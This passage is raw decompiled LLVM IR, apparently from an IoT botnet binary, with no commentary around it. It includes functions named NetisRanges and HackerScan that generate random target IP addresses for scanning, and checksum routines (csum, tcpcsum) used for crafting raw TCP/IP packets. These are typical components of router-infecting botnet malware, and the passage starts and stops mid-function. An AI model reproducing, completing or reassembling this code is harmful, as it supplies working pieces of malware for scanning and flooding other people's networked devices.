  br label %dec_label_pc_d550

dec_label_pc_d550:                                ; preds = %dec_label_pc_d51c, %dec_label_pc_d528
  %v7_d554 = icmp eq i32 %v2_a93c, 205
  br i1 %v7_d554, label %dec_label_pc_d55c, label %dec_label_pc_d584

dec_label_pc_d55c:                                ; preds = %dec_label_pc_d550
  %v2_d55c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d568 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d574 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d580 = sext i8 %v3_d568 to i32
  %v6_d580 = sext i8 %v3_d574 to i32
  %v8_d580 = call i32 @szprintf(i32 %v2_d55c, i32 ptrtoint ([13 x i8]* @global_var_20984.463 to i32), i32 %v4_d580, i32 %v6_d580, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d584

dec_label_pc_d584:                                ; preds = %dec_label_pc_d550, %dec_label_pc_d55c
  %v7_d588 = icmp eq i32 %v2_a93c, 206
  br i1 %v7_d588, label %dec_label_pc_d590, label %dec_label_pc_d5b8

dec_label_pc_d590:                                ; preds = %dec_label_pc_d584
  %v2_d590 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d59c = load i8, i8* @global_var_2c601.66, align 1
  %v3_d5a8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d5b4 = sext i8 %v3_d59c to i32
  %v6_d5b4 = sext i8 %v3_d5a8 to i32
  %v8_d5b4 = call i32 @szprintf(i32 %v2_d590, i32 ptrtoint ([13 x i8]* @global_var_20994.465 to i32), i32 %v4_d5b4, i32 %v6_d5b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5b8

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d584, %dec_label_pc_d590
  %v7_d5bc = icmp eq i32 %v2_a93c, 207
  %v2_d5c4 = ptrtoint i32* %stack_var_-36 to i32
  br i1 %v7_d5bc, label %dec_label_pc_d5c4, label %dec_label_pc_d5ec

dec_label_pc_d5c4:                                ; preds = %dec_label_pc_d5b8
  %v3_d5d0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d5dc = load i8, i8* @global_var_2c602.67, align 1
  %v4_d5e8 = sext i8 %v3_d5d0 to i32
  %v6_d5e8 = sext i8 %v3_d5dc to i32
  %v8_d5e8 = call i32 @szprintf(i32 %v2_d5c4, i32 ptrtoint ([14 x i8]* @global_var_209a4.467 to i32), i32 %v4_d5e8, i32 %v6_d5e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5ec

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d5b8, %dec_label_pc_d5c4
  br i1 false, label %dec_label_pc_d5f8, label %dec_label_pc_d620

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5ec
  br label %dec_label_pc_d620

dec_label_pc_d620:                                ; preds = %dec_label_pc_d5ec, %dec_label_pc_d5f8
  store i32 %v2_d5c4, i32* @r0, align 4
  %v1_d628 = call i32 @inet_addr(i32 %v2_d5c4)
  store i32 %v3_a7b8, i32* @fp, align 4
  ret i32 %v1_d628

; uselistorder directives
  uselistorder i32 %v2_d5c4, { 1, 0, 2 }
  uselistorder i32 %v0_a8d8, { 1, 0 }
  uselistorder i32 %v0_a88c, { 1, 0 }
  uselistorder i32 %v0_a840, { 1, 0 }
  uselistorder i32 %v0_a7f4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_206d4.376 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_20668.361 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_204d8.310 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_2044c.292 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_203ec.280 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_20034.159 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_20014.155 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_20004.153 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1ffd4.147 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_d620, { 1, 0 }
  uselistorder label %dec_label_pc_d5ec, { 1, 0 }
  uselistorder label %dec_label_pc_d5b8, { 1, 0 }
  uselistorder label %dec_label_pc_d584, { 1, 0 }
  uselistorder label %dec_label_pc_d550, { 1, 0 }
  uselistorder label %dec_label_pc_d51c, { 1, 0 }
  uselistorder label %dec_label_pc_d4e8, { 1, 0 }
  uselistorder label %dec_label_pc_d4b4, { 1, 0 }
  uselistorder label %dec_label_pc_d44c, { 1, 0 }
  uselistorder label %dec_label_pc_d418, { 1, 0 }
  uselistorder label %dec_label_pc_d3e4, { 1, 0 }
  uselistorder label %dec_label_pc_d3b0, { 1, 0 }
  uselistorder label %dec_label_pc_d37c, { 1, 0 }
  uselistorder label %dec_label_pc_d348, { 1, 0 }
  uselistorder label %dec_label_pc_d314, { 1, 0 }
  uselistorder label %dec_label_pc_d2e0, { 1, 0 }
  uselistorder label %dec_label_pc_d2ac, { 1, 0 }
  uselistorder label %dec_label_pc_d278, { 1, 0 }
  uselistorder label %dec_label_pc_d244, { 1, 0 }
  uselistorder label %dec_label_pc_d210, { 1, 0 }
  uselistorder label %dec_label_pc_d1dc, { 1, 0 }
  uselistorder label %dec_label_pc_d1a8, { 1, 0 }
  uselistorder label %dec_label_pc_d174, { 1, 0 }
  uselistorder label %dec_label_pc_d140, { 1, 0 }
  uselistorder label %dec_label_pc_d10c, { 1, 0 }
  uselistorder label %dec_label_pc_d0d8, { 1, 0 }
  uselistorder label %dec_label_pc_d0a4, { 1, 0 }
  uselistorder label %dec_label_pc_d070, { 1, 0 }
  uselistorder label %dec_label_pc_d03c, { 1, 0 }
  uselistorder label %dec_label_pc_d008, { 1, 0 }
  uselistorder label %dec_label_pc_cfd4, { 1, 0 }
  uselistorder label %dec_label_pc_cfa0, { 1, 0 }
  uselistorder label %dec_label_pc_cf6c, { 1, 0 }
  uselistorder label %dec_label_pc_cf38, { 1, 0 }
  uselistorder label %dec_label_pc_cf04, { 1, 0 }
  uselistorder label %dec_label_pc_ced0, { 1, 0 }
  uselistorder label %dec_label_pc_ce9c, { 1, 0 }
  uselistorder label %dec_label_pc_ce68, { 1, 0 }
  uselistorder label %dec_label_pc_ce34, { 1, 0 }
  uselistorder label %dec_label_pc_ce00, { 1, 0 }
  uselistorder label %dec_label_pc_cdcc, { 1, 0 }
  uselistorder label %dec_label_pc_cd98, { 1, 0 }
  uselistorder label %dec_label_pc_cd64, { 1, 0 }
  uselistorder label %dec_label_pc_cd30, { 1, 0 }
  uselistorder label %dec_label_pc_ccfc, { 1, 0 }
  uselistorder label %dec_label_pc_ccc8, { 1, 0 }
  uselistorder label %dec_label_pc_cc94, { 1, 0 }
  uselistorder label %dec_label_pc_cc60, { 1, 0 }
  uselistorder label %dec_label_pc_cc2c, { 1, 0 }
  uselistorder label %dec_label_pc_cbf8, { 1, 0 }
  uselistorder label %dec_label_pc_cbc4, { 1, 0 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb5c, { 1, 0 }
  uselistorder label %dec_label_pc_cb28, { 1, 0 }
  uselistorder label %dec_label_pc_caf4, { 1, 0 }
  uselistorder label %dec_label_pc_cac0, { 1, 0 }
  uselistorder label %dec_label_pc_ca8c, { 1, 0 }
  uselistorder label %dec_label_pc_ca58, { 1, 0 }
  uselistorder label %dec_label_pc_ca24, { 1, 0 }
  uselistorder label %dec_label_pc_c9f0, { 1, 0 }
  uselistorder label %dec_label_pc_c9bc, { 1, 0 }
  uselistorder label %dec_label_pc_c988, { 1, 0 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %dec_label_pc_c920, { 1, 0 }
  uselistorder label %dec_label_pc_c8ec, { 1, 0 }
  uselistorder label %dec_label_pc_c8b8, { 1, 0 }
  uselistorder label %dec_label_pc_c884, { 1, 0 }
  uselistorder label %dec_label_pc_c850, { 1, 0 }
  uselistorder label %dec_label_pc_c81c, { 1, 0 }
  uselistorder label %dec_label_pc_c7e8, { 1, 0 }
  uselistorder label %dec_label_pc_c7b4, { 1, 0 }
  uselistorder label %dec_label_pc_c780, { 1, 0 }
  uselistorder label %dec_label_pc_c74c, { 1, 0 }
  uselistorder label %dec_label_pc_c718, { 1, 0 }
  uselistorder label %dec_label_pc_c6e4, { 1, 0 }
  uselistorder label %dec_label_pc_c6b0, { 1, 0 }
  uselistorder label %dec_label_pc_c67c, { 1, 0 }
  uselistorder label %dec_label_pc_c648, { 1, 0 }
  uselistorder label %dec_label_pc_c614, { 1, 0 }
  uselistorder label %dec_label_pc_c5e0, { 1, 0 }
  uselistorder label %dec_label_pc_c5ac, { 1, 0 }
  uselistorder label %dec_label_pc_c578, { 1, 0 }
  uselistorder label %dec_label_pc_c544, { 1, 0 }
  uselistorder label %dec_label_pc_c510, { 1, 0 }
  uselistorder label %dec_label_pc_c4dc, { 1, 0 }
  uselistorder label %dec_label_pc_c4a8, { 1, 0 }
  uselistorder label %dec_label_pc_c474, { 1, 0 }
  uselistorder label %dec_label_pc_c440, { 1, 0 }
  uselistorder label %dec_label_pc_c40c, { 1, 0 }
  uselistorder label %dec_label_pc_c3d8, { 1, 0 }
  uselistorder label %dec_label_pc_c3a4, { 1, 0 }
  uselistorder label %dec_label_pc_c370, { 1, 0 }
  uselistorder label %dec_label_pc_c33c, { 1, 0 }
  uselistorder label %dec_label_pc_c308, { 1, 0 }
  uselistorder label %dec_label_pc_c2d4, { 1, 0 }
  uselistorder label %dec_label_pc_c2a0, { 1, 0 }
  uselistorder label %dec_label_pc_c26c, { 1, 0 }
  uselistorder label %dec_label_pc_c238, { 1, 0 }
  uselistorder label %dec_label_pc_c204, { 1, 0 }
  uselistorder label %dec_label_pc_c1d0, { 1, 0 }
  uselistorder label %dec_label_pc_c19c, { 1, 0 }
  uselistorder label %dec_label_pc_c168, { 1, 0 }
  uselistorder label %dec_label_pc_c134, { 1, 0 }
  uselistorder label %dec_label_pc_c100, { 1, 0 }
  uselistorder label %dec_label_pc_c0cc, { 1, 0 }
  uselistorder label %dec_label_pc_c098, { 1, 0 }
  uselistorder label %dec_label_pc_c064, { 1, 0 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_bffc, { 1, 0 }
  uselistorder label %dec_label_pc_bfc8, { 1, 0 }
  uselistorder label %dec_label_pc_bf94, { 1, 0 }
  uselistorder label %dec_label_pc_bf60, { 1, 0 }
  uselistorder label %dec_label_pc_bf2c, { 1, 0 }
  uselistorder label %dec_label_pc_bef8, { 1, 0 }
  uselistorder label %dec_label_pc_bec4, { 1, 0 }
  uselistorder label %dec_label_pc_be90, { 1, 0 }
  uselistorder label %dec_label_pc_be5c, { 1, 0 }
  uselistorder label %dec_label_pc_be28, { 1, 0 }
  uselistorder label %dec_label_pc_bdf4, { 1, 0 }
  uselistorder label %dec_label_pc_bdc0, { 1, 0 }
  uselistorder label %dec_label_pc_bd8c, { 1, 0 }
  uselistorder label %dec_label_pc_bd58, { 1, 0 }
  uselistorder label %dec_label_pc_bd24, { 1, 0 }
  uselistorder label %dec_label_pc_bcf0, { 1, 0 }
  uselistorder label %dec_label_pc_bcbc, { 1, 0 }
  uselistorder label %dec_label_pc_bc88, { 1, 0 }
  uselistorder label %dec_label_pc_bc54, { 1, 0 }
  uselistorder label %dec_label_pc_bc20, { 1, 0 }
  uselistorder label %dec_label_pc_bbec, { 1, 0 }
  uselistorder label %dec_label_pc_bbb8, { 1, 0 }
  uselistorder label %dec_label_pc_bb84, { 1, 0 }
  uselistorder label %dec_label_pc_bb50, { 1, 0 }
  uselistorder label %dec_label_pc_bb1c, { 1, 0 }
  uselistorder label %dec_label_pc_bae8, { 1, 0 }
  uselistorder label %dec_label_pc_bab4, { 1, 0 }
  uselistorder label %dec_label_pc_ba80, { 1, 0 }
  uselistorder label %dec_label_pc_ba4c, { 1, 0 }
  uselistorder label %dec_label_pc_ba18, { 1, 0 }
  uselistorder label %dec_label_pc_b9e4, { 1, 0 }
  uselistorder label %dec_label_pc_b764, { 1, 0 }
  uselistorder label %dec_label_pc_b730, { 1, 0 }
  uselistorder label %dec_label_pc_b6fc, { 1, 0 }
  uselistorder label %dec_label_pc_b6c8, { 1, 0 }
  uselistorder label %dec_label_pc_b694, { 1, 0 }
  uselistorder label %dec_label_pc_b660, { 1, 0 }
  uselistorder label %dec_label_pc_b62c, { 1, 0 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5c4, { 1, 0 }
  uselistorder label %dec_label_pc_b590, { 1, 0 }
  uselistorder label %dec_label_pc_b55c, { 1, 0 }
  uselistorder label %dec_label_pc_b528, { 1, 0 }
  uselistorder label %dec_label_pc_b4f4, { 1, 0 }
  uselistorder label %dec_label_pc_b4c0, { 1, 0 }
  uselistorder label %dec_label_pc_b48c, { 1, 0 }
  uselistorder label %dec_label_pc_b458, { 1, 0 }
  uselistorder label %dec_label_pc_b424, { 1, 0 }
  uselistorder label %dec_label_pc_b3f0, { 1, 0 }
  uselistorder label %dec_label_pc_b3bc, { 1, 0 }
  uselistorder label %dec_label_pc_b388, { 1, 0 }
  uselistorder label %dec_label_pc_b354, { 1, 0 }
  uselistorder label %dec_label_pc_b320, { 1, 0 }
  uselistorder label %dec_label_pc_b2ec, { 1, 0 }
  uselistorder label %dec_label_pc_b2b8, { 1, 0 }
  uselistorder label %dec_label_pc_b284, { 1, 0 }
  uselistorder label %dec_label_pc_b250, { 1, 0 }
  uselistorder label %dec_label_pc_b21c, { 1, 0 }
  uselistorder label %dec_label_pc_b1e8, { 1, 0 }
  uselistorder label %dec_label_pc_b1b4, { 1, 0 }
  uselistorder label %dec_label_pc_b180, { 1, 0 }
  uselistorder label %dec_label_pc_b14c, { 1, 0 }
  uselistorder label %dec_label_pc_b118, { 1, 0 }
  uselistorder label %dec_label_pc_b0e4, { 1, 0 }
  uselistorder label %dec_label_pc_b0b0, { 1, 0 }
  uselistorder label %dec_label_pc_b07c, { 1, 0 }
  uselistorder label %dec_label_pc_b048, { 1, 0 }
  uselistorder label %dec_label_pc_b014, { 1, 0 }
  uselistorder label %dec_label_pc_afe0, { 1, 0 }
  uselistorder label %dec_label_pc_afac, { 1, 0 }
  uselistorder label %dec_label_pc_af78, { 1, 0 }
  uselistorder label %dec_label_pc_af44, { 1, 0 }
  uselistorder label %dec_label_pc_af10, { 1, 0 }
  uselistorder label %dec_label_pc_aedc, { 1, 0 }
  uselistorder label %dec_label_pc_aea8, { 1, 0 }
  uselistorder label %dec_label_pc_ae74, { 1, 0 }
  uselistorder label %dec_label_pc_ae40, { 1, 0 }
  uselistorder label %dec_label_pc_ae0c, { 1, 0 }
  uselistorder label %dec_label_pc_add8, { 1, 0 }
  uselistorder label %dec_label_pc_ada4, { 1, 0 }
  uselistorder label %dec_label_pc_ad70, { 1, 0 }
  uselistorder label %dec_label_pc_ad3c, { 1, 0 }
  uselistorder label %dec_label_pc_ad08, { 1, 0 }
  uselistorder label %dec_label_pc_acd4, { 1, 0 }
  uselistorder label %dec_label_pc_aca0, { 1, 0 }
  uselistorder label %dec_label_pc_ac6c, { 1, 0 }
  uselistorder label %dec_label_pc_ac38, { 1, 0 }
  uselistorder label %dec_label_pc_ac04, { 1, 0 }
  uselistorder label %dec_label_pc_abd0, { 1, 0 }
  uselistorder label %dec_label_pc_ab9c, { 1, 0 }
  uselistorder label %dec_label_pc_ab68, { 1, 0 }
  uselistorder label %dec_label_pc_ab34, { 1, 0 }
  uselistorder label %dec_label_pc_ab00, { 1, 0 }
  uselistorder label %dec_label_pc_aacc, { 1, 0 }
  uselistorder label %dec_label_pc_aa98, { 1, 0 }
  uselistorder label %dec_label_pc_aa64, { 1, 0 }
  uselistorder label %dec_label_pc_aa30, { 1, 0 }
  uselistorder label %dec_label_pc_a9fc, { 1, 0 }
  uselistorder label %dec_label_pc_a9c8, { 1, 0 }
  uselistorder label %dec_label_pc_a994, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_d730 = load i32, i32* @r4, align 4
  %v6_d730 = load i32, i32* @fp, align 4
  %v13_d730 = load i32, i32* @lr, align 4
  store i32 55096, i32* %stack_var_-4, align 4
  %v2_d734 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d734, i32* @fp, align 4
  %v0_d73c = call i32 @rand()
  %v3_d75c = urem i32 %v0_d73c, 57
  %v4_d794 = mul nuw nsw i32 %v3_d75c, 4
  %v5_d794 = add i32 %v4_d794, ptrtoint (i32* @global_var_2c284.472 to i32)
  %v6_d794 = inttoptr i32 %v5_d794 to i32*
  %v7_d794 = load i32, i32* %v6_d794, align 4
  %v1_d7a0 = trunc i32 %v7_d794 to i8
  store i8 %v1_d7a0, i8* @global_var_2c5ff.64, align 1
  %v0_d7a4 = call i32 @rand()
  %v2_d7c0 = sdiv i32 %v0_d7a4, 51
  %tmp20 = mul i32 %v2_d7c0, -255
  %v2_d7d8 = add i32 %tmp20, %v0_d7a4
  %v1_d7ec = trunc i32 %v2_d7d8 to i8
  store i8 %v1_d7ec, i8* @global_var_2c600.65, align 1
  %v0_d7f0 = call i32 @rand()
  %v2_d80c = sdiv i32 %v0_d7f0, 51
  %tmp21 = mul i32 %v2_d80c, -255
  %v2_d824 = add i32 %tmp21, %v0_d7f0
  %v1_d838 = trunc i32 %v2_d824 to i8
  store i8 %v1_d838, i8* @global_var_2c601.66, align 1
  %v0_d83c = call i32 @rand()
  %v2_d858 = sdiv i32 %v0_d83c, 51
  %tmp22 = mul i32 %v2_d858, -255
  %v2_d870 = add i32 %tmp22, %v0_d83c
  %v1_d884 = trunc i32 %v2_d870 to i8
  store i8 %v1_d884, i8* @global_var_2c602.67, align 1
  %v2_d888 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d8c4 = load i8, i8* bitcast (i8** @global_var_2c5fe.63 to i8*), align 4
  %v3_d8c4 = zext i8 %v2_d8c4 to i32
  %v3_d8d0 = load i8, i8* @global_var_2c5ff.64, align 1
  %v4_d8d0 = zext i8 %v3_d8d0 to i32
  store i32 %v4_d8d0, i32* @r4, align 4
  %v3_d8dc = load i8, i8* @global_var_2c600.65, align 1
  %v6_d904 = sext i8 %v3_d8d0 to i32
  %v8_d904 = sext i8 %v3_d8dc to i32
  %v9_d904 = call i32 @szprintf(i32 %v2_d888, i32 ptrtoint ([12 x i8]* @global_var_209c4.476 to i32), i32 %v3_d8c4, i32 %v6_d904, i32 %v8_d904)
  store i32 %v2_d888, i32* @r0, align 4
  %v1_d910 = call i32 @inet_addr(i32 %v2_d888)
  store i32 %v3_d730, i32* @r4, align 4
  store i32 %v6_d730, i32* @fp, align 4
  store i32 %v13_d730, i32* @lr, align 4
  ret i32 %v1_d910

; uselistorder directives
  uselistorder i32 %v2_d888, { 2, 1, 0 }
  uselistorder i32 %v0_d83c, { 1, 0 }
  uselistorder i32 %v0_d7f0, { 1, 0 }
  uselistorder i32 %v0_d7a4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_2c602.67, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2c601.66, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2c600.65, { 3, 2, 1, 0 }
  uselistorder i32 51, { 0, 1, 2, 7, 3, 4, 5, 6 }
  uselistorder i8* @global_var_2c5ff.64, { 3, 2, 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @HackerScan(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_d954 = load i32, i32* @global_var_32844.478, align 4
  %v1_d95c = call i32 @__GI_ntohl(i32 %v2_d954)
  %v2_d968 = and i32 %v1_d95c, %arg1
  %v0_d970 = call i32 @rand_cmwc()
  %v1_d97c = sub i32 -1, %arg1
  %v2_d980 = and i32 %v0_d970, %v1_d97c
  %v2_d988 = xor i32 %v2_d980, %v2_d968
  ret i32 %v2_d988
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_da149 = icmp sgt i32 %arg2, 1
  br i1 %v8_da149, label %dec_label_pc_d9cc, label %dec_label_pc_da18

dec_label_pc_d9cc:                                ; preds = %entry, %dec_label_pc_d9cc
  %v2_d9e0 = phi i32 [ %v2_d9e4, %dec_label_pc_d9cc ], [ 0, %entry ]
  %stack_var_-44.012 = phi i32 [ %v5_d9e8, %dec_label_pc_d9cc ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v1_da04, %dec_label_pc_d9cc ], [ %arg2, %entry ]
  %stack_var_-36.010 = phi i16* [ %v5_d9fc, %dec_label_pc_d9cc ], [ %arg1, %entry ]
  %v4_d9cc = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_d9d0 = load i16, i16* %stack_var_-36.010, align 2
  %v3_d9d0 = zext i16 %v2_d9d0 to i32
  %v2_d9e4 = add i32 %v3_d9d0, %v2_d9e0
  %v3_d9e4 = icmp ult i32 %v2_d9e4, %v2_d9e0
  %v4_d9e8 = zext i1 %v3_d9e4 to i32
  %v5_d9e8 = add i32 %v4_d9e8, %stack_var_-44.012
  %v1_d9f8 = add i32 %v4_d9cc, 2
  %v5_d9fc = inttoptr i32 %v1_d9f8 to i16*
  %v1_da04 = add nsw i32 %stack_var_-40.011, -2
  %v8_da14 = icmp sgt i32 %v1_da04, 1
  br i1 %v8_da14, label %dec_label_pc_d9cc, label %dec_label_pc_da0c.dec_label_pc_da18_crit_edge

dec_label_pc_da0c.dec_label_pc_da18_crit_edge:    ; preds = %dec_label_pc_d9cc
  br label %dec_label_pc_da18

dec_label_pc_da18:                                ; preds = %dec_label_pc_da0c.dec_label_pc_da18_crit_edge, %entry
  %v2_da38 = phi i32 [ %v2_d9e4, %dec_label_pc_da0c.dec_label_pc_da18_crit_edge ], [ 0, %entry ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_d9fc, %dec_label_pc_da0c.dec_label_pc_da18_crit_edge ], [ %arg1, %entry ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_d9e8, %dec_label_pc_da0c.dec_label_pc_da18_crit_edge ], [ 0, %entry ]
  %v7_da10.lcssa.in = phi i32 [ %v1_da04, %dec_label_pc_da0c.dec_label_pc_da18_crit_edge ], [ %arg2, %entry ]
  %v7_da10.lcssa = icmp eq i32 %v7_da10.lcssa.in, 1
  br i1 %v7_da10.lcssa, label %dec_label_pc_da24, label %dec_label_pc_daa0.preheader

dec_label_pc_da24:                                ; preds = %dec_label_pc_da18
  %v1_da28 = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_da28 = load i8, i8* %v1_da28, align 1
  %v3_da28 = zext i8 %v2_da28 to i32
  %v2_da3c = add i32 %v3_da28, %v2_da38
  %v3_da3c = icmp ult i32 %v2_da3c, %v2_da38
  %v4_da40 = zext i1 %v3_da3c to i32
  %v5_da40 = add i32 %v4_da40, %stack_var_-44.0.lcssa
  br label %dec_label_pc_daa0.preheader

dec_label_pc_daa0.preheader:                      ; preds = %dec_label_pc_da24, %dec_label_pc_da18
  %v3_dacc.ph = phi i32 [ %v2_da38, %dec_label_pc_da18 ], [ %v2_da3c, %dec_label_pc_da24 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_da18 ], [ %v5_da40, %dec_label_pc_da24 ]
  %v3_daa437 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_daac38 = udiv i32 %v3_dacc.ph, 65536
  %v2_dab039 = or i32 %v3_daa437, %v3_daac38
  %v3_dab840 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_dac041 = or i32 %v2_dab039, %v3_dab840
  %v2_dac442 = icmp eq i32 %v2_dac041, 0
  br i1 %v2_dac442, label %dec_label_pc_dacc, label %dec_label_pc_da50

dec_label_pc_da50:                                ; preds = %dec_label_pc_daa0.preheader, %dec_label_pc_da50
  %v3_dab845 = phi i32 [ %v3_dab8, %dec_label_pc_da50 ], [ %v3_dab840, %dec_label_pc_daa0.preheader ]
  %v2_dab044 = phi i32 [ %v2_dab0, %dec_label_pc_da50 ], [ %v2_dab039, %dec_label_pc_daa0.preheader ]
  %v3_dacc43 = phi i32 [ %v2_da90, %dec_label_pc_da50 ], [ %v3_dacc.ph, %dec_label_pc_daa0.preheader ]
  %v2_da64 = urem i32 %v3_dacc43, 65536
  %v2_da90 = add i32 %v2_dab044, %v2_da64
  %v3_da90 = icmp ult i32 %v2_da90, %v2_da64
  %v4_da94 = zext i1 %v3_da90 to i32
  %v5_da94 = add nuw nsw i32 %v4_da94, %v3_dab845
  %v3_daa4 = mul i32 %v5_da94, 65536
  %v3_daac = udiv i32 %v2_da90, 65536
  %v2_dab0 = or i32 %v3_daa4, %v3_daac
  %v3_dab8 = udiv i32 %v5_da94, 65536
  %v2_dac0 = or i32 %v2_dab0, %v3_dab8
  %v2_dac4 = icmp eq i32 %v2_dac0, 0
  br i1 %v2_dac4, label %dec_label_pc_daa0.dec_label_pc_dacc_crit_edge, label %dec_label_pc_da50

dec_label_pc_daa0.dec_label_pc_dacc_crit_edge:    ; preds = %dec_label_pc_da50
  br label %dec_label_pc_dacc

dec_label_pc_dacc:                                ; preds = %dec_label_pc_daa0.dec_label_pc_dacc_crit_edge, %dec_label_pc_daa0.preheader
  %v3_dacc.lcssa = phi i32 [ %v2_da90, %dec_label_pc_daa0.dec_label_pc_dacc_crit_edge ], [ %v3_dacc.ph, %dec_label_pc_daa0.preheader ]
  %v1_dad8 = urem i32 %v3_dacc.lcssa, 65536
  %v3_dae0 = xor i32 %v1_dad8, 65535
  ret i32 %v3_dae0

; uselistorder directives
  uselistorder i32 %v2_dab0, { 1, 0 }
  uselistorder i32 %v5_da94, { 1, 0 }
  uselistorder i32 %v2_da90, { 2, 0, 3, 1 }
  uselistorder i32 %v3_dab840, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_dacc.ph, { 2, 1, 0 }
  uselistorder i32 %v2_da38, { 0, 2, 1 }
  uselistorder i32 %v1_da04, { 0, 2, 1 }
  uselistorder i32 %v2_d9e4, { 0, 2, 1 }
  uselistorder i32 %v2_d9e0, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_da50, { 1, 0 }
  uselistorder label %dec_label_pc_d9cc, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_daf8 = load i32, i32* @fp, align 4
  store i32 56064, i32* %stack_var_-4, align 4
  %v2_dafc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dafc, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_db1c = add i32 %arg1, 12
